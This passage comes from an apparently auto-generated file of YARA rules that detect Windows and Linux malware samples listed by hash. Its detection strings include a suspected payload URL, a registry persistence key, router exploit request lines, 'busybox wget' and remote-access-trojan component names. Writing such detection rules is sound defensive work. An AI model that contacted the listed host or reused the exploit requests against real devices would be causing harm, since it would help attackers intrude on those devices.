        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "\\Microsoft\\Network\\Connections"
        $s5 = "https://clfeed.online/keyfileupdate/rst32.jpg"
        $s6 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $s7 = "Microsoft.Win32"
        $s8 = "<Module>"
        $s9 = "RDZBOEI0NDUtODY1NC00MUYwLUEzOTMtM0ZCMDA5NkZFNjJEQUFB"
        $s10 = "System.IO"
        $s11 = "Thread"
        $s12 = "set_Method"
        $s13 = "set_Mode"
        $s14 = "GetEnvironmentVariable"
        $s15 = "File"
        $s16 = "set_FileName"
        $s17 = "WriteLine"
        $s18 = "HttpWebResponse"
        $s19 = "GetResponse"
        $s20 = "Close"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10KB and
        all of them
}

rule Linux_164e9826d76a4614e525719487ec5ba06d4d4fd22b2339577af3683b50045d0b
{
    meta:
        description = "Auto ML: 164e9826d76a4614e525719487ec5ba06d4d4fd22b2339577af3683b50045d0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "jic|[setme"
        $s2 = ".text"
        $s3 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Linux_e8884be11c02bfb630f1e52b9f062f816e98cea492d05378f72fb496ca029c32
{
    meta:
        description = "Auto ML: e8884be11c02bfb630f1e52b9f062f816e98cea492d05378f72fb496ca029c32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB and
        all of them
}

rule Windows_e8a8103e86118016856e61ab2cf1e0c75235d87b76302bce2537a14d9b0c04a1
{
    meta:
        description = "Auto ML: e8a8103e86118016856e61ab2cf1e0c75235d87b76302bce2537a14d9b0c04a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "<Module>"
        $s6 = "IwOfJgW.exe"
        $s7 = "UserCreate"
        $s8 = "System"
        $s9 = "System.Windows.Forms"
        $s10 = "System.ComponentModel"
        $s11 = "System.Reflection"
        $s12 = "AssemblyFileVersionAttribute"
        $s13 = "System.Runtime.InteropServices"
        $s14 = "System.Runtime.CompilerServices"
        $s15 = "System.Security.Cryptography"
        $s16 = "Create"
        $s17 = "System.Text"
        $s18 = "GetBytes"
        $s19 = "CreateDecryptor"
        $s20 = "get_ParameterType"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 332KB and
        all of them
}

rule Windows_e8af36287e2270581fd5f2d28c6e0b83b337f58d430554d28dbf55d2ca09fcca
{
    meta:
        description = "Auto ML: e8af36287e2270581fd5f2d28c6e0b83b337f58d430554d28dbf55d2ca09fcca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "FdeiAnS.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "GetString"
        $s8 = "ModuleHandle"
        $s9 = "System.Collections.Generic"
        $s10 = "System.Management"
        $s11 = "System.Reflection"
        $s12 = "CreateMemberRefsDelegates"
        $s13 = "CreateGetStringDelegate"
        $s14 = "System.Security"
        $s15 = "System.Runtime.CompilerServices"
        $s16 = "AssemblyFileVersionAttribute"
        $s17 = "AttributeTargets"
        $s18 = "get_Scheme"
        $s19 = "WriteLine"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18457KB and
        all of them
}

rule Windows_e8b221cba5c3598522f1ebd2b5e52b2f45699a1965b5dd677a9b9d074677873e
{
    meta:
        description = "Auto ML: e8b221cba5c3598522f1ebd2b5e52b2f45699a1965b5dd677a9b9d074677873e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB and
        all of them
}

rule Windows_e8e307f94d9319f62b20920b93bec8ad8fad2341a3fa1d072a0cd8257295d881
{
    meta:
        description = "Auto ML: e8e307f94d9319f62b20920b93bec8ad8fad2341a3fa1d072a0cd8257295d881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1881KB and
        all of them
}

rule Linux_e8e428592478d9ed2e5baa70d7cf6e8d9a89f8d9d6942c1178b806b4cb5888ca
{
    meta:
        description = "Auto ML: e8e428592478d9ed2e5baa70d7cf6e8d9a89f8d9d6942c1178b806b4cb5888ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 169KB and
        all of them
}

rule Linux_e8fe0f983eaf27b565d681b5edd1775eafeb98bb5742d6976aaf176aaa13befb
{
    meta:
        description = "Auto ML: e8fe0f983eaf27b565d681b5edd1775eafeb98bb5742d6976aaf176aaa13befb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Windows_e909f6d833125f008ea789af8fdfb40041c2fecbca437a8f0da7e289efbebe89
{
    meta:
        description = "Auto ML: e909f6d833125f008ea789af8fdfb40041c2fecbca437a8f0da7e289efbebe89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_XgNKIrJR"
        $s7 = "System.Collections.Generic"
        $s8 = "connectionId"
        $s9 = "Thread"
        $s10 = "Load"
        $s11 = "_contentLoaded"
        $s12 = "get_Checked"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "System.Collections.Specialized"
        $s16 = "ReadToEnd"
        $s17 = "set_Method"
        $s18 = "CreateInstance"
        $s19 = "get_Source"
        $s20 = "set_Source"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB and
        all of them
}

rule Windows_e96703038fcb644285ae23b1e3e71b39dbe1252f6aeeb1c3d963c285703a7ad8
{
    meta:
        description = "Auto ML: e96703038fcb644285ae23b1e3e71b39dbe1252f6aeeb1c3d963c285703a7ad8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_e96e988d061758a49d60b1240dc7fac645c42e698231ce85aac89eb23facd866
{
    meta:
        description = "Auto ML: e96e988d061758a49d60b1240dc7fac645c42e698231ce85aac89eb23facd866"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "h.rsrc"
        $s5 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s6 = "api-ms-win-crt-filesystem-l1-1-0.dll"
        $s7 = "KERNEL32.dll"
        $s8 = "4Normaliz.dll"
        $s9 = "USERENV.dll"
        $s10 = "api-ms-win-crt-time-l1-1-0.dll"
        $s11 = "WINHTTP.dll"
        $s12 = "WinHttpOpenRequest"
        $s13 = "CRYPT32.dll"
        $s14 = "WININET.dll"
        $s15 = "D3D11CreateDeviceAndSwapChain"
        $s16 = "RtlVirtualUnwind"
        $s17 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s18 = "WLDAP32.dll"
        $s19 = "ntdll.dll"
        $s20 = "aUSER32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17181KB and
        all of them
}

rule Windows_1657a01593f2f519b59e0b94007cf1909940ded07bb6022bf4f39be173a64b61
{
    meta:
        description = "Auto ML: 1657a01593f2f519b59e0b94007cf1909940ded07bb6022bf4f39be173a64b61"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "][]]980e439165c5a77b=nekoTyeKcilbuP ,lartuen=erutluC ,0.0.0.4=noisreV ,bilrocsm ,tcejbO.metsyS[[1`ygetartSeloRrttA+metIegasseM+yciloPeloRrekroW.seciloP.bifsnlvC"
        $s6 = "ygetartSeloReluR.seigetartS.bifsnlvC$"
        $s7 = "ygetartSeloRrotpecretnI.seigetartS.bifsnlvC+"
        $s8 = "rttAtseT"
        $s9 = "tluser_tesffo"
        $s10 = "metsySeteleD"
        $s11 = "metsySetadpU"
        $s12 = "metsySetupmoC"
        $s13 = "metsySetirW"
        $s14 = "tnahcreMtseT"
        $s15 = "metsyStseT"
        $s16 = "metsySetaluclaC"
        $s17 = "metIygetarts"
        $s18 = "kcabllaCtseT"
        $s19 = "ssalCtseT"
        $s20 = "metIstset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 664KB and
        all of them
}

rule Windows_e9784ddc7220f06d1543b7b1fe22c05d70599204e62c39b935bb93f670ab8a88
{
    meta:
        description = "Auto ML: e9784ddc7220f06d1543b7b1fe22c05d70599204e62c39b935bb93f670ab8a88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ICC_PROFILE"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = ",This set of build callbacks has already run."
        $s7 = "An error occurred while attempting to automatically activate registration '{0}'. See the inner exception for information on the source of the failure."
        $s8 = "AA delegate registered to create instances of '{0}' returned null."
        $s9 = "NInstances cannot be created by this activator as it has already been disposed."
        $s10 = "The provided instance of '{0}' has already been used in an activation request. Did you combine a provided instance with non-root/single-instance lifetime/sharing?"
        $s11 = "NThe Disposer object has already been Disposed, so no items can be added to it."
        $s12 = "The tag '{0}' has already been assigned to a parent lifetime scope. If you are using Owned<T> this indicates you may have a circular dependency chain."
        $s13 = "Instances cannot be resolved and nested lifetimes cannot be created from this LifetimeScope as it (or one of its parent scopes) has already been disposed."
        $s14 = "The constructor of type '{0}' attempted to create another instance of itself. This is not permitted because the service is configured to only allowed a single instance per lifetime scope."
        $s15 = "BComponent pipeline has already been built, and cannot be modified."
        $s16 = "-The activation has already been executed: {0}"
        $s17 = "Unable to resolve the type '{0}' because the lifetime scope it belongs in can't be located. The following services are exposed by this registration:"
        $s18 = "BMiddleware provided to the UseRange method must be in phase order."
        $s19 = "@Subclasses of Autofac.Service must override Object.GetHashCode()"
        $s20 = "Target: {0}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8960KB and
        all of them
}

rule Windows_e98d3352f1529d8ac7ba663df506f4db64bed2471ef3cb7831eda8fb61868f35
{
    meta:
        description = "Auto ML: e98d3352f1529d8ac7ba663df506f4db64bed2471ef3cb7831eda8fb61868f35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 731KB and
        all of them
}

rule Windows_e9da8094392d8124c615595ebabc8e3ce15c94922c7f5540e12974eee9113a86
{
    meta:
        description = "Auto ML: e9da8094392d8124c615595ebabc8e3ce15c94922c7f5540e12974eee9113a86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_dLgZ"
        $s7 = "System.Data"
        $s8 = "Load"
        $s9 = "set_Enabled"
        $s10 = "get_DataSource"
        $s11 = "set_DataSource"
        $s12 = "set_AutoScaleMode"
        $s13 = "set_ColumnHeadersHeightSizeMode"
        $s14 = "get_IdLotFabricatie"
        $s15 = "set_IdLotFabricatie"
        $s16 = "get_UnitateMasuraMateriale"
        $s17 = "set_UnitateMasuraMateriale"
        $s18 = "get_NumeMateriale"
        $s19 = "set_NumeMateriale"
        $s20 = "get_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB and
        all of them
}

rule Windows_e9dca9a5faee679c0262540243c40a9c62d21ce491c93cbf15059db98f18f22c
{
    meta:
        description = "Auto ML: e9dca9a5faee679c0262540243c40a9c62d21ce491c93cbf15059db98f18f22c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6618KB and
        all of them
}

rule Linux_e9dde263d548e82af911eed5cc8331ebad4c66e267815939816cda7b6972c9db
{
    meta:
        description = "Auto ML: e9dde263d548e82af911eed5cc8331ebad4c66e267815939816cda7b6972c9db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB and
        all of them
}

rule Windows_e9e605bf0298e0e2374188893b63868c1926c7997f4e257e8ea91ddcfd315b6f
{
    meta:
        description = "Auto ML: e9e605bf0298e0e2374188893b63868c1926c7997f4e257e8ea91ddcfd315b6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ErrorFieldConnector"
        $s6 = "INVGS240104NA_pdf.Connections"
        $s7 = "System"
        $s8 = "IsReadOnlyAttribute"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "Thread`1"
        $s11 = "TouchSocket.Specifications"
        $s12 = "TouchSocket.Services"
        $s13 = "TouchSocket.Dictionaries"
        $s14 = "TouchSocket.Common"
        $s15 = "TouchSocket.Filters"
        $s16 = "CandidateFieldConnector"
        $s17 = "TouchSocket.Watchers"
        $s18 = "ProcessorReponsePage"
        $s19 = "<TryWriteAsync>d__35"
        $s20 = "WebSocketMessageType"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB and
        all of them
}

rule Windows_ea040833f500c29fb2229a00c1578500c65fffddab8eea70083ef392cc066bc4
{
    meta:
        description = "Auto ML: ea040833f500c29fb2229a00c1578500c65fffddab8eea70083ef392cc066bc4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_ea07e8062d246770a4e005383f07009ea465801f429ebedf6e4fc0667ec143b1
{
    meta:
        description = "Auto ML: ea07e8062d246770a4e005383f07009ea465801f429ebedf6e4fc0667ec143b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "ADVAPI32.dll"
        $s7 = "WriteFile"
        $s8 = "GetConsoleMode"
        $s9 = "CreateDirectoryA"
        $s10 = "GetModuleFileNameA"
        $s11 = "CopyFileA"
        $s12 = "SetStdHandle"
        $s13 = "IsProcessorFeaturePresent"
        $s14 = "RegCloseKey"
        $s15 = "GetStartupInfoW"
        $s16 = "GetProcAddress"
        $s17 = "GetCPInfo"
        $s18 = "WriteConsoleW"
        $s19 = "OpenProcessToken"
        $s20 = "FlushFileBuffers"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2588KB and
        all of them
}

rule Windows_ea0ac7277d0fdf801972b56bdc57184fc51ac8be47438873396436736f3694a9
{
    meta:
        description = "Auto ML: ea0ac7277d0fdf801972b56bdc57184fc51ac8be47438873396436736f3694a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "8wG4cO6lWS2FT,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_ea0e1edd416c2080d13fffc20ab4648156e4acf792d13f2dd9286a0a2b7bdc0a
{
    meta:
        description = "Auto ML: ea0e1edd416c2080d13fffc20ab4648156e4acf792d13f2dd9286a0a2b7bdc0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4436KB and
        all of them
}

rule Windows_166b798b46ade1deb2065fdae79134537ca4eaa83ad3a4598878b07ac94c8861
{
    meta:
        description = "Auto ML: 166b798b46ade1deb2065fdae79134537ca4eaa83ad3a4598878b07ac94c8861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "jpxbHfecrEXK,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5471KB and
        all of them
}

rule Windows_ea3eb80612d2c63022e0b649b6bfe11ee97a20920bc97f2ff423571b8594a9e3
{
    meta:
        description = "Auto ML: ea3eb80612d2c63022e0b649b6bfe11ee97a20920bc97f2ff423571b8594a9e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3612KB and
        all of them
}

rule Windows_ea625f82fef9caeef34a90f6a239676f8b830ad127152c89cac75dc6824c986c
{
    meta:
        description = "Auto ML: ea625f82fef9caeef34a90f6a239676f8b830ad127152c89cac75dc6824c986c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6687KB and
        all of them
}

rule Linux_ea6f0dd8a16f8b66691ebe44af651b00e9bd4cc76346ad17314cda0672784d7f
{
    meta:
        description = "Auto ML: ea6f0dd8a16f8b66691ebe44af651b00e9bd4cc76346ad17314cda0672784d7f"
